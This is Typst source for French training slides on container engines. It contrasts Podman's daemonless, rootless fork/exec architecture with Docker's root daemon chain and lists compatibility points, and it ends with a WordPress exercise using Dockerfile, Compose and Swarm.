#let _note = [Podman (pod manager), moteur de conteneurs de Red Hat, bibliothèque libpod. Architecture d’après la documentation Podman et Red Hat « What is Podman » (redhat.com/en/topics/containers/what-is-podman). Modèle fork/exec : podman run duplique le processus de l’utilisateur ; l’enfant met en place le conteneur et exec le runtime OCI (crun par défaut, ou runc), sous la surveillance de conmon (le moniteur de conteneur, qui tient le tty, les journaux et le code de sortie). Le conteneur n’est donc pas l’enfant d’un démon root mais de l’utilisateur ; conmon le garde en vie après la fermeture du CLI. À comparer avec la chaîne Docker client → dockerd (root) → containerd → runc (diapositives Architecture et Le démon Docker). Rootless par défaut : mêmes user namespaces que la diapositive correspondante, mais actifs d’emblée, sans démon root ni groupe docker. Debian 13 : paquet podman 5.4.2. Source : docs Podman, podman.io.]
#anime(
  rang(
    bloc[Docker : un démon central][
      #terminal(titre: none, taille: px(13))[```
  client docker
    ↓  API REST (/var/run/docker.sock)
  dockerd         — en root
    ↓
  containerd
    ↓
  runc (OCI)  →  conteneur
  ```]
    ],
    bloc(role: "pratique")[Podman : fork/exec, sans démon][
      #terminal(titre: none, taille: px(13))[```
  podman          — utilisateur
    ↓  fork + exec (pas de démon)
  conmon          — moniteur par conteneur
    ↓
  crun / runc (OCI)
    ↓
  conteneur  (survit à la sortie du CLI)
  ```]
    ],
  ),
  note(role: "retenir")[Pas de démon central en root : `podman` lance le conteneur par fork/exec ; `conmon` le surveille et récolte son code de sortie. Le conteneur est un *fils de l'utilisateur* : l'audit attribue l'action à la personne. Rootless par défaut (user namespace + `/etc/subuid`), sans « groupe docker = root ». Persistance par systemd (Quadlet, `podman generate systemd`).],
  note: _note,
)

== Podman et Docker : différences et compatibilité
#let _note = [Tableau et compatibilité d’après la documentation Podman et Red Hat « What is Podman », la page Debian du paquet podman (5.4.2 sur Debian 13) et podman.io. Sans démon : plus de point unique en root ni d’appartenance au groupe docker équivalant à root (diapositive Le démon Docker) ; l’audit attribue chaque conteneur à son utilisateur. Compatibilité : la CLI reprend les mêmes verbes que Docker (run, build, images, ps…), d’où alias docker\=podman et le paquet podman-docker qui installe une commande docker ; podman build réutilise Buildah, podman lit les Dockerfile et les images OCI/Docker Hub. podman system service expose un socket compatible avec l’API Docker, ce qui fait tourner docker compose et les outils qui lisent /var/run/docker.sock (à filtrer de même, cf. annexe socket). Pods : un groupe de conteneurs partageant les namespaces (réseau, IPC…) autour d’un conteneur « infra », calqué sur le pod Kubernetes ; podman kube play consomme un manifeste Kubernetes. Mêmes mécanismes du noyau que Docker et même runtime OCI (crun/runc) : toute la partie Sécurité (capabilities, seccomp, AppArmor, user namespaces) reste valable. Sources : redhat.com/en/topics/containers/what-is-podman, docs.podman.io, packages.debian.org/trixie/podman.]
#anime(
  rang(
    bloc[Les différences][
      #lignes(largeur: px(150),
        ([*Démon*], [Docker : `dockerd` en root (SPOF). Podman : aucun, `conmon` par conteneur]),
        ([*Droits*], [Docker : root, rootless en option. Podman : rootless par défaut]),
        ([*Persistance*], [Docker : `--restart`. Podman : systemd (Quadlet)]),
        ([*Groupement*], [Docker : Compose. Podman : Pods (comme Kubernetes)]),
        ([*Build*], [`docker build` (BuildKit) / `podman build` (Buildah)]),
      )
    ],
    bloc(role: "pratique")[Compatible avec l'écosystème Docker][
      - CLI quasi identique : `alias docker=podman` ; paquet `podman-docker`
      - Lit les Dockerfile, images OCI et Docker Hub : rien à réécrire
      - API Docker émulée (`podman system service`) : `docker compose` et Traefik fonctionnent
      - Mêmes primitives du noyau et même runtime OCI : la partie Sécurité s'applique telle quelle
      - `podman kube play` : pont direct vers Kubernetes
    ],
  ),
  note: _note,
)

== Travaux pratiques
#let _note = [Compose : utiliser « docker compose » (v2) ; « docker-compose » (v1) n’est plus maintenu (fin de vie en 2023). Swarm reste fonctionnel, mais Kubernetes concentre l’essentiel des évolutions.]
#anime(
  rang(
    bloc(role: "question")[Réaliser un service WordPress conteneurisé][
      + *Dockerfile*
      + *Docker Compose*
      + *Docker Swarm*
    ],
  ),
  note(role: "retenir")[Support de TP : #link("https://github.com/jmchantrein/formation_docker")[`github.com/jmchantrein/formation_docker`] — Licence Creative Commons BY-NC-SA 3.0 (Attribution, Pas d'utilisation commerciale, Partage dans les mêmes conditions).],
  note: _note,
)
